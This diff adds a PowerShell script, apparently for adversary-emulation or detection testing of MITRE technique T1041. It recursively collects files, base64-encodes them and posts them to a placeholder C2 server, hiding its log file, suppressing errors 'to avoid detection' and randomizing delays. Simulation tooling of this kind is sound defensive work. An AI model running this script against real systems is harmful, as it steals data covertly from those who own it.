@@ -1,0 +1,111 @@
+#This is a test to detect data exfil using PowerShell, with no external binary execution
+#T1041 - Exfiltration Over C2 Channel
+
+# Configuration
+$DataDir = "C:\TestData"  # Directory containing files to exfiltrate
+$C2Url = "http://your-c2-server:8080"  # Replace with your C2 server URL
+$LogFile = "$env:TEMP\.exfil.log"  # Hidden log file in temp directory
+
+# Set log file as hidden
+try {
+    if (-not (Test-Path $LogFile)) {
+        New-Item -ItemType File -Path $LogFile -Force | Out-Null
+        Set-ItemProperty -Path $LogFile -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+    }
+} catch {
+    # Silent failure to avoid detection
+}
+
+# Function to log messages
+function Write-Log {
+    param ($Message)
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$timestamp - $Message" | Out-File -FilePath $LogFile -Append -Encoding utf8
+}
+
+# Function to collect files
+function Get-Files {
+    param ($Directory)
+    try {
+        $files = Get-ChildItem -Path $Directory -File -Recurse -ErrorAction SilentlyContinue
+        Write-Log "Collected $($files.Count) files from $Directory"
+        return $files
+    } catch {
+        Write-Log "Error collecting files: $_"
+        return @()
+    }
+}
+
+# Function to encode file content
+function Encode-File {
+    param ($FilePath)
+    try {
+        $content = [System.IO.File]::ReadAllBytes($FilePath)
+        $encoded = [Convert]::ToBase64String($content)
+        Write-Log "Encoded file: $FilePath"
+        return $encoded
+    } catch {
+        Write-Log "Error encoding file $FilePath: $_"
+        return $null
+    }
+}
+
+# Function to exfiltrate data
+function Exfil-Data {
+    param ($FilePath, $EncodedContent)
+    try {
+        $payload = @{
+            filename = [System.IO.Path]::GetFileName($FilePath)
+            data = $EncodedContent
+            timestamp = (Get-Date -Format "o")
+        } | ConvertTo-Json -Compress
+        $response = Invoke-WebRequest -Uri $C2Url -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
+        if ($response.StatusCode -eq 200) {
+            Write-Log "Successfully exfiltrated $FilePath"
+            return $true
+        } else {
+            Write-Log "Failed to exfiltrate $FilePath. Status: $($response.StatusCode)"
+            return $false
+        }
+    } catch {
+        Write-Log "Error exfiltrating $FilePath: $_"
+        return $false
+    }
+}
+
+# Main execution
+Write-Log "Starting exfiltration simulation"
+
+# Verify directory exists
+if (-not (Test-Path $DataDir)) {
+    Write-Log "Directory $DataDir does not exist"
+    exit
+}
+
+# Collect files
+$files = Get-Files -Directory $DataDir
+if ($files.Count -eq 0) {
+    Write-Log "No files found to exfiltrate"
+    exit
+}
+
+# Exfiltrate each file
+foreach ($file in $files) {
+    $encodedContent = Encode-File -FilePath $file.FullName
+    if ($encodedContent) {
+        $success = Exfil-Data -FilePath $file.FullName -EncodedContent $encodedContent
+        if ($success) {
+            Write-Log "Exfiltration completed for $file.FullName"
+        } else {
+            Write-Log "Exfiltration failed for $file.FullName"
+        }
+    } else {
+        Write-Log "Skipping $file.FullName due to encoding failure"
+    }
+    
+    # Randomized delay (2-5 seconds)
+    $delay = Get-Random -Minimum 2 -Maximum 6
+    Start-Sleep -Seconds $delay
+}
+
+Write-Log "Exfiltration simulation completed"
